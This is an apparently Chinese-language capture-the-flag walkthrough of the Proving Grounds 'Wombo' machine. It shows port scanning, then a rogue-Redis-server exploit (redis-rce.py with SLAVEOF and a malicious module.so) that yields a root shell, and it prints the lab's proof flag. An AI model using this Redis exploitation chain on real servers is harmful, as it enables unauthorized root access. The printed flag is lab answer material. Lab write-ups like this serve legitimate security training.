参考资料  
[https://github.com/pika5164/Offsec_Proving_Grounds/blob/master/PG_Practice/Linux/Wombo.md](https://github.com/pika5164/Offsec_Proving_Grounds/blob/master/PG_Practice/Linux/Wombo.md)
   

枚举开放的端口和服务，以识别在端口 6379 上运行的 Redis 服务器。  
确认 Redis 版本并调查已知漏洞。  
部署一台恶意 Redis 服务器来攻击远程服务。  
执行命令以获取目标机器的 root shell。  
了解将配置错误的数据库服务暴露于网络的后果。
 
rustscan安装  
curl --proto '=https' --tlsv1.2 -sSf [https:](https://sh.rustup.rs)//sh.rustup.rs | sh
 
cargo install rustscan
    
添加系统环境变量
 
export rustscan=/home/kali/.cargo/bin  
export PATH=$PATH:$rustscan/bin
   

rustscan -a 192.168.161.69 -u 5000 -t 8000 --scripts -- -n -Pn -sVC
   

/home/kali/.cargo/bin
  ┌──(kali㉿kali)-[~/Desktop/pg03/Wombo/redis-rce]  
└─$ nmap -sS 192.168.161.69 -p 6379  
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org) ) at 2025-12-27 22:02 EST  
Nmap scan report for 192.168.161.69  
Host is up (0.15s latency).
 
PORT STATE SERVICE  
6379/tcp open redis
 
Nmap done: 1 IP address (1 host up) scanned in 0.66 seconds   ┌──(kali㉿kali)-[~/Desktop/pg03/Wombo/redis-rce]  
└─$ python3 redis-rce.py -f module.so -r 192.168.161.69 -p 6379 -L 192.168.45.168 -P 6379
 
█▄▄▄▄ ▄███▄ ██▄ ▄█ ▄▄▄▄▄ █▄▄▄▄ ▄█▄ ▄███▄  
█ ▄▀ █▀ ▀ █ █ ██ █ ▀▄ █ ▄▀ █▀ ▀▄ █▀ ▀  
█▀▀▌ ██▄▄ █ █ ██ ▄ ▀▀▀▀▄ █▀▀▌ █ ▀ ██▄▄  
█ █ █▄ ▄▀ █ █ ▐█ ▀▄▄▄▄▀ █ █ █▄ ▄▀ █▄ ▄▀  
█ ▀███▀ ███▀ ▐ █ ▀███▀ ▀███▀  
▀ ▀
   

[*] Connecting to 192.168.161.69:6379...  
[*] Sending SLAVEOF command to server  
[+] Accepted connection from 192.168.161.69:6379  
[*] Setting filename  
[+] Accepted connection from 192.168.161.69:6379  
[*] Start listening on 192.168.45.168:6379  
[*] Tring to run payload  
[+] Accepted connection from 192.168.161.69:43637  
[*] Closing rogue server...
 
[+] What do u want ? [i]nteractive shell or [r]everse shell or [e]xit: i  
[+] Interactive shell open , use "exit" to exit...  
$ whomai
   

$ cat /root/proof.txt  
d2cb17f86b5f2ce5e27418c378eb939a  
$